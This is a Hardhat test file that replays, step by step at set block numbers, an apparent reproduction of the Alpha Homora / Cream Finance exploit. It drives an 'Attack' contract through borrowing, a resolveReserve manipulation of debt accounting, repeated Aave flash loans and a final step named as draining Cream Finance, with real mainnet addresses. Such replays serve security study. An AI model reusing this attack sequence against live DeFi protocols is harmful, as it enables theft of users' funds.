const {
  mine,
  mineUpTo,
  time,
  loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { parseUnits } = require("ethers/lib/utils");
const { ethers } = require("hardhat");

describe("Alpha Finance Attack", function () {
  const sUSD = "0x57Ab1ec28D129707052df4dF418D58a2D46d5f51";
  const ETHamount = parseUnits("1.5", 18);
  let attacker,
    attack,
    homoraBank,
    curve3Pool,
    curveGauge,
    a3CRVT,
    susd,
    cysusd,
    uniethLP;

  async function deployContractFixture() {
    // Contracts are deployed using the first signer/account by default
    [attacker, ...addrs] = await ethers.getSigners();

    const Attack = await ethers.getContractFactory("Attack");
    attack = await Attack.deploy();
    await attack.deployed();

    homoraBank = await ethers.getContractAt(
      "IHomoraBank",
      "0x5f5Cd91070960D13ee549C9CC47e7a4Cd00457bb"
    );
    curve3Pool = await ethers.getContractAt(
      "ICurve",
      "0xFd2a8fA60Abd58Efe3EeE34dd494cD491dC14900"
    );
    curveGauge = await ethers.getContractAt(
      "ICurveLPGauge",
      "0xd662908ADA2Ea1916B3318327A97eB18aD588b5d"
    );
    susd = await ethers.getContractAt(
      "IERC20",
      "0x57Ab1ec28D129707052df4dF418D58a2D46d5f51"
    );
    a3CRVT = await ethers.getContractAt(
      "IERC20",
      "0xFd2a8fA60Abd58Efe3EeE34dd494cD491dC14900"
    );
    cysusd = await ethers.getContractAt(
      "IERC20",
      "0x4e3a36A633f63aee0aB57b5054EC78867CB3C0b8"
    );
    uniethLP = await ethers.getContractAt(
      "IUniswapV2Pair",
      "0xd3d2E2692501A5c9Ca623199D38826e513033a17"
    );

    return { attacker, attack };
  }

  describe("Exploiter Attack", function () {
    before(async () => {
      await loadFixture(deployContractFixture);
    });

    it("# step 2 : Swap and Add Liquidity", async function () {
      // from block number 11846579 to start
      let uinethLPBalancePre = await uniethLP.balanceOf(attack.address);
      let cysusdBalancePre = await cysusd.balanceOf(attack.address);
      await attack.attack2({ value: ETHamount });

      expect(await uniethLP.balanceOf(attack.address)).to.gt(
        uinethLPBalancePre
      );
      expect(await cysusd.balanceOf(attack.address)).to.gt(cysusdBalancePre);
    });

    it("# step 3 : Borrow ", async function () {
      // add blocks to finish block number is 11846605
      await mineUpTo(11846604);

      let susdBalancePre = await susd.balanceOf(attack.address);
      let data = await abiEncodeWithSignature(
        "execute3(uint256)",
        ["uint"],
        [1000]
      );
      await homoraBank.execute(0, attack.address, data);

      expect(await uniethLP.balanceOf(attack.address)).to.equal(0);
      expect(await susd.balanceOf(attack.address)).to.gt(susdBalancePre);
    });

    it("# step 4 : Repay", async function () {
      // add blocks to finish block number is 11846608
      await mineUpTo(11846607);

      let data = await abiEncodeWithSignature("execute4()");
      await homoraBank.execute(883, attack.address, data);

      let info = await homoraBank.getBankInfo(sUSD);
      let totalDebt = info.totalDebt;
      let totalShare = info.totalShare;
      expect(totalDebt).to.equal(1);
      expect(totalShare).to.equal(1);
      [token, amount] = await homoraBank.getPositionDebts(883);
      expect(amount[0]).to.equal(1);
      expect(await homoraBank.getPositionDebtShareOf(883, sUSD)).to.equal(1);
    });

    it("# step 5 : Call resolveReserve", async () => {
      // add blocks to finish block number is 11846612
      await mineUpTo(11846611);

      await homoraBank.resolveReserve(sUSD);

      let info = await homoraBank.getBankInfo(sUSD);
      let totalDebt = info.totalDebt; // -19701013816706
      let totalShare = info.totalShare;
      expect(totalDebt).to.equal(19701013816706);
      expect(totalShare).to.equal(1);
      expect(await susd.balanceOf(homoraBank.address)).to.equal(19701013816705); //-19701013816705
    });

    it("# step 6 : Borrow more", async () => {
      // add blocks to finish block number is 11846618
      await mineUpTo(11846617);
      let cysusdBalancePre = await cysusd.balanceOf(attack.address);
      let data = abiEncodeWithSignature("execute6(uint256)", ["uint"], [16]);
      await homoraBank.execute(0, attack.address, data);

      expect(await cysusd.balanceOf(attack.address)).to.gt(cysusdBalancePre);
      expect(await susd.balanceOf(attack.address)).to.equal(0);
    });

    it("# step 7 : Repeat step 6 to borrow more", async () => {
      // add blocks to finish block number is 11846623
      await mineUpTo(11846622);
      let cysusdBalancePre = await cysusd.balanceOf(attack.address);
      let data = abiEncodeWithSignature("execute6(uint256)", ["uint"], [10]);
      await homoraBank.execute(0, attack.address, data);

      expect(await cysusd.balanceOf(attack.address)).to.gt(cysusdBalancePre);
      expect(await susd.balanceOf(attack.address)).to.equal(0);
    });

    it("# step 8 : Flashloan from AAVE and continue borrow from homoraBank", async () => {
      // add blocks to finish block number is 11846627
      await mineUpTo(11846626);
      let prevBalance = await cysusd.balanceOf(attack.address);
      let data = abiEncodeWithSignature(
        "execute8(uint256,uint256)",
        ["uint", "uint"],
        [10, 1800000000000]
      );
      await homoraBank.execute(0, attack.address, data);
      expect(await cysusd.balanceOf(attack.address)).to.gt(prevBalance);
    });

    it("# step 9 : Repeat step 8 to flashloan from AAVE and continue borrow from homoraBank", async () => {
      // add blocks to finish block number is 11846631
      await mineUpTo(11846630);
      let prevBalance = await cysusd.balanceOf(attack.address);
      let data = abiEncodeWithSignature(
        "execute8(uint256,uint256)",
        ["uint", "uint"],
        [7, 10000000000000]
      );
      await homoraBank.execute(0, attack.address, data);
      expect(await cysusd.balanceOf(attack.address)).to.gt(prevBalance);
    });

    it("# step 10 : Repeat step 9 to flashloan from AAVE and continue borrow from homoraBank", async () => {
      // add blocks to finish block number is 11846641
      await mineUpTo(11846640);
      let prevBalance = await cysusd.balanceOf(attack.address);
      let data = abiEncodeWithSignature(
        "execute8(uint256,uint256)",
        ["uint", "uint"],
        [2, 10000000000000]
      );
      await homoraBank.execute(0, attack.address, data);
      expect(await cysusd.balanceOf(attack.address)).to.gt(prevBalance);
    });

    it("# step 11 : Drain all tokens in cream finance", async () => {
      // add blocks to finish block number is 11846647
      let preETHBalance = await ethers.provider.getBalance(attacker.address);
      await mineUpTo(11846646);
      await attack.attack11();

      let a3CRVTBalance = await a3CRVT.balanceOf(attacker.address);
      expect(await curve3Pool.balanceOf(attacker.address)).to.eq(a3CRVTBalance);
      expect(await ethers.provider.getBalance(attacker.address)).to.gt(
        preETHBalance
      );
    });

    it("# step 12 : Deposit to curve aave gauge", async () => {
      let lpAmount = await curve3Pool.balanceOf(attacker.address);
      //approve curve gauge to transferFrom curve3Pool Lp tokens
      await curve3Pool.approve(curveGauge.address, lpAmount);
      await curveGauge.deposit(lpAmount);
      expect(await curve3Pool.balanceOf(attacker.address)).to.equal(0);
    });
  });
});

async function abiEncodeWithSignature(_functionName, ..._params) {
  if (_params.length > 0) {
    let bytes = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(_functionName));
    let selector = bytes.slice(0, 10);

    let params = ethers.utils.defaultAbiCoder.encode(_params[0], _params[1]);
    params = params.slice(2);

    let data = selector + params;
    return data;
  } else {
    let bytes = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(_functionName));
    let selector = bytes.slice(0, 10);

    return selector;
  }
}
